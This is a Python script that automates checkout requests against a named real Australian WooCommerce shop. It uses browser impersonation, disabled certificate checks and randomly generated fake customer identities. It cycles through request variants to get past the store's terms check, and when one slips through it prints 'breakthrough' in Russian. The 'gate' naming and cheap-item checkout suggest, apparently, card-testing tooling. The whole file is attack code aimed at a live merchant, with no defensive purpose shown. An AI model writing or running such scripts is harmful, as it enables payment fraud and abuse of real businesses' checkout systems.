# -*- coding: utf-8 -*-
import asyncio, json, os, sys
sys.stdout.reconfigure(encoding="utf-8")
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from curl_cffi.requests import AsyncSession
import gate_client as gc

async def main():
    root = "https://coachconnectaustralia.com.au"
    async with AsyncSession(impersonate="chrome131", verify=False) as s:
        api = f"{root}/wp-json/wc/store/v1"
        r_cart = await s.get(f"{api}/cart", timeout=10)
        nn = r_cart.headers.get("nonce")
        r_prod = await s.get(f"{api}/products", params={"per_page": 30}, headers={"Nonce": nn}, timeout=10)
        nn = r_prod.headers.get("nonce") or nn
        cand = sorted((p for p in r_prod.json() if p.get("prices", {}).get("price") and int(p["prices"]["price"]) > 0),
                      key=lambda p: int(p["prices"]["price"]))
        p0 = [p for p in cand if int(p["prices"]["price"]) == 15] or cand
        p0 = p0[0]
        r_add = await s.post(f"{api}/cart/add-item", params={"id": p0["id"], "quantity": "1"}, headers={"Nonce": nn}, timeout=10)
        nn = r_add.headers.get("nonce") or nn
        addr = gc.geo_identity_fields("AU"); ident = gc.random_identity("AU")
        base_addr = {"first_name": ident["first_name"], "last_name": ident["last_name"], "company": "",
            "address_1": addr["line1"], "address_2": "", "city": addr["city"], "state": addr["state"],
            "postcode": addr["postal_code"], "country": "AU", "email": ident["email"],
            "phone": "+61 2 555 0123"}
        variants = [
            ("terms-in-payment_data", {"payment_data": [
                {"key": "wc-stripe-payment-method", "value": "pm_card_visa_chargeDeclined"},
                {"key": "wc-stripe-payment-type", "value": "card"},
                {"key": "terms", "value": "on"}]}),
            ("additional_fields", {"additional_fields": {"terms": True}, "payment_data": [
                {"key": "wc-stripe-payment-method", "value": "pm_card_visa_chargeDeclined"},
                {"key": "wc-stripe-payment-type", "value": "card"}]}),
            ("extensions", {"extensions": {"terms": True}, "payment_data": [
                {"key": "wc-stripe-payment-method", "value": "pm_card_visa_chargeDeclined"},
                {"key": "wc-stripe-payment-type", "value": "card"}]}),
        ]
        for name, extra in variants:
            body = {"billing_address": base_addr,
                "customer_note": "", "create_account": True, "terms": True,
                "payment_method": "stripe", **extra}
            r_co = await s.post(f"{api}/checkout", json=body, headers={"Nonce": nn}, timeout=20)
            nn = r_co.headers.get("nonce") or nn
            try: d = r_co.json()
            except Exception: d = {}
            print(f"[{name}] {r_co.status_code} code={d.get('code')} msg={str(d.get('message'))[:100]}")
            if d.get("code") != "terms_error":
                print("  ПРОРЫВ:", json.dumps(d, ensure_ascii=False)[:300])
                break

asyncio.run(main())
